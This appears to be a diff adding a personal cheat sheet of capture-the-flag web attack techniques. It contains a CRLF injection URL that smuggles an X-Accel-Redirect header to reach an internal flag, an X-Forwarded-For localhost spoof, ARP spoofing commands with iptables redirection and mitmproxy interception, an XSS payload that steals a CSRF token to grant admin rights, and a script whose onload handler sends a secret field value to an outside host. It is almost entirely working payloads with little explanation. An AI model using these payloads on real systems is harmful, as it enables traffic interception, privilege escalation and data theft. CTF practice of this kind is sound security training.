@@ -1,0 +1,35 @@
+path for access the flag is http://109.233.61.11:27280/secret/flag but since its marked with “internal” we aren’t able to access it. We’ll be able to do that trought CRLF in “retpath” parameter
+
+nginx file download thingy
+injecting X-Accel-Redirect for bypassing this:
+http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
+
+Adding a 'X-Forwarded-For' header pointing to localhost
+X-Forwarded-For: 127.0.0.1
+
+# Standard ARP spoof setup
+
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+arpspoof -i eth0 -t 192.168.10.9 192.168.10.10
+
+Then I started mitmproxy in reverse proxy mode:
+
+mitmproxy -R https://192.168.10.10
+
+# CSRF
+<img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
+
+# Client-Side
+</pre>
+<script type="text/javascript">
+RegExp = function() {
+    return {'test' : function(){
+        return true;
+    }}
+}
+</script>
+<input type="text" id="secretbox" value="nop" />
+<script id="bla" src="http://challs.ctf.site:10000/safebox/file.js" type="text/javascript" onload="document.location.href='http://doma.in/?s='+document.getElementById('secretbox').value;"></script>
+
+# 2READ
+https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies/
